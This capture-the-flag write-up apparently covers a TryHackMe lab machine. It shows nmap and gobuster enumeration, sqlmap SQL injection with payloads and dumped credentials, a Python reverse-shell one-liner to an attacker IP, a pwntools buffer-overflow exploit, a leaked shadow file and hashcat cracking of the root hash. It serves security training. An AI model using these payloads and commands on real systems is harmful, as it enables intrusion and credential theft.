### IP
`10.10.41.142`

# Host Enumeration

### nmap
`nmap -sC -sV 10.10.41.142 -oN init.nmap`
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 23:04 EDT
Nmap scan report for 10.10.41.142
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.99 seconds	
```
# Web Enumeration

### gobuster
`gobuster dir -u 10.10.41.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.41.142
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/03/26 23:10:14 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/administrator.php    (Status: 200) [Size: 409]  
/server-status        (Status: 403) [Size: 277]  
Progress: 757416 / 882244 (85.85%)              ^C
[!] Keyboard interrupt detected, terminating.
                                                 
===============================================================
2021/03/26 23:39:00 Finished

```

# Web Exploitation

### sqlmap
* Putting a `'` in the login form gives us this error: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1`
	* Thus, we know this is using MySQL

`sqlmap -u http://10.10.41.142/administrator.php --forms --dump --dbms=mysql`
```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.3#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:36:51 /2021-03-26/

[23:36:51] [INFO] testing connection to the target URL
[23:36:52] [INFO] searching for forms
[#1] form:
POST http://10.10.41.142/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[23:37:02] [INFO] using '/root/.local/share/sqlmap/output/results-03262021_1137pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=NIDZ' RLIKE (SELECT (CASE WHEN (9938=9938) THEN 0x4e49445a ELSE 0x28 END))-- ETdI&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=NIDZ' AND GTID_SUBSET(CONCAT(0x716a626b71,(SELECT (ELT(8142=8142,1))),0x717a627871),8142)-- Izjp&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=NIDZ' AND (SELECT 8478 FROM (SELECT(SLEEP(5)))HKLn)-- vjtj&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[23:37:04] [INFO] testing MySQL
[23:37:04] [INFO] confirming MySQL
[23:37:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[23:37:04] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:37:04] [INFO] fetching current database
[23:37:04] [INFO] resumed: 'users'
[23:37:04] [INFO] fetching tables for database: 'users'
[23:37:05] [INFO] retrieved: 'users'
[23:37:05] [INFO] fetching columns for table 'users' in database 'users'
[23:37:05] [INFO] retrieved: 'username'
[23:37:05] [INFO] retrieved: 'varchar(100)'
[23:37:05] [INFO] retrieved: 'password'
[23:37:05] [INFO] retrieved: 'varchar(100)'
[23:37:05] [INFO] fetching entries for table 'users' in database 'users'
[23:37:06] [INFO] retrieved: 'secretpass'
[23:37:06] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[23:37:06] [INFO] table 'users.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.41.142/dump/users/users.csv'
[23:37:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-03262021_1137pm.csv'

[*] ending @ 23:37:06 /2021-03-26/

```
# Command Execution
* We can get a reverse shell with `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.36.105",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
	* Run `nc -lvnp 1337` locally

* We can find the hidden password with `find -name hidden* 2>/dev/null`
	* `cat /var/hidden/pass` gives us `pinguapingu`

* Now we can connect with `ssh pingu@10.10.41.142`

# LinEnum
* We can find suid binaries with `find / -perm -u=s -type f 2>/dev/null`
	* One of them is `/opt/secret/root`

# pwndbg
* I don't like pwndbg, so I'm going to use gef locally by downloading it using `python3 -m http.server 80` and `wget http://10.10.41.142:8080/root` remotely

### gef
1. `gdb root`
2. `disas main`
```
Dump of assembler code for function main:
   0x08048521 <+0>:	lea    ecx,[esp+0x4]
   0x08048525 <+4>:	and    esp,0xfffffff0
   0x08048528 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804852b <+10>:	push   ebp
   0x0804852c <+11>:	mov    ebp,esp
   0x0804852e <+13>:	push   ecx
   0x0804852f <+14>:	sub    esp,0x4
   0x08048532 <+17>:	call   0x8048504 <get_input>
   0x08048537 <+22>:	mov    eax,0x0
   0x0804853c <+27>:	add    esp,0x4
   0x0804853f <+30>:	pop    ecx
   0x08048540 <+31>:	pop    ebp
   0x08048541 <+32>:	lea    esp,[ecx-0x4]
   0x08048544 <+35>:	ret    
End of assembler dump.
```
3. `disas get_input`
```
Dump of assembler code for function get_input:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	sub    esp,0x28
   0x0804850a <+6>:	sub    esp,0x8
   0x0804850d <+9>:	lea    eax,[ebp-0x28]
   0x08048510 <+12>:	push   eax
   0x08048511 <+13>:	push   0x80485ec
   0x08048516 <+18>:	call   0x80483b0 <__isoc99_scanf@plt>
   0x0804851b <+23>:	add    esp,0x10
   0x0804851e <+26>:	nop
   0x0804851f <+27>:	leave  
   0x08048520 <+28>:	ret    
End of assembler dump.
```
4. `b *get_input + 23` (we want to break after the input)
5. `r`
6. `AAAA`
7. `tele $esp-20 21` (play around with start and stop bounds until you see esp and ebp)
```
0xffffd1fc│+0x0000: 0x00000002
0xffffd200│+0x0004: 0xffffd220  →  "AAAA"
0xffffd204│+0x0008: 0xf7ffd980  →  0x00000000
0xffffd208│+0x000c: 0xf7e07105  →  <__isoc99_scanf+5> add eax, 0x18fefb
0xffffd20c│+0x0010: 0x0804851b  →  <get_input+23> add esp, 0x10
0xffffd210│+0x0014: 0x080485ec  →  0x00007325 ("%s"?)	 ← $esp
0xffffd214│+0x0018: 0xffffd220  →  "AAAA"
0xffffd218│+0x001c: 0x08048034  →   push es
0xffffd21c│+0x0020: 0xf7f98a28  →  0x00000000
0xffffd220│+0x0024: "AAAA"
0xffffd224│+0x0028: 0xf7fe4000  →   and al, 0x8
0xffffd228│+0x002c: 0x00000000
0xffffd22c│+0x0030: 0xf7de9c1e  →   add esp, 0x10
0xffffd230│+0x0034: 0xf7f973fc  →  0xf7f98a40  →  0x00000000
0xffffd234│+0x0038: 0xffffffff
0xffffd238│+0x003c: 0x00000000
0xffffd23c│+0x0040: 0x0804859b  →  <__libc_csu_init+75> add edi, 0x1
0xffffd240│+0x0044: 0x00000001
0xffffd244│+0x0048: 0xffffd314  →  0xffffd4a1  →  "/root/Desktop/CTFs/TryHackMe/TheCodCaper/root"
0xffffd248│+0x004c: 0xffffd258  →  0x00000000	 ← $ebp
0xffffd24c│+0x0050: 0x08048537  →  <main+22> mov eax, 0x0
```
	* The offset is `0x50 - 0x24`, which is `0x2c`, or `44`
8. The sourcecode tells us that theres a function called `shell`

### buffer overflow
`exploit.py`
```python
from pwn import *

e = ELF('./root')
p = process('./root')

offset = 0x50 - 0x24

payload = b'A'*offset
payload += p32(e.sym['shell'])

p.sendline(payload)

p.interactive()
```
* Running this code remotely with `python exploit.py` prints the `shadow.bak` file:
```
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
```

* The root hash is `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`

# Finishing the job
* We can figure out which hash type the above is using `hashcat --example-hashes | grep 'HASH: \$6' -B2 -A1`, which gets us the following:
```
MODE: 1800
TYPE: sha512crypt $6$, SHA512 (Unix)
HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1
PASS: hashcat
```
* We can run `hashcat -m 1800 root.hash /usr/share/wordlists/rockyou.txt -a 0`
```
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
Time.Started.....: Sat Mar 27 00:27:42 2021 (6 mins, 5 secs)
Time.Estimated...: Sat Mar 27 00:33:47 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      657 H/s (7.91ms) @ Accel:64 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 239872/14344384 (1.67%)
Rejected.........: 0/239872 (0.00%)
Restore.Point....: 239616/14344384 (1.67%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: lucinha -> lospollitos
```
* The password is `love2fish`

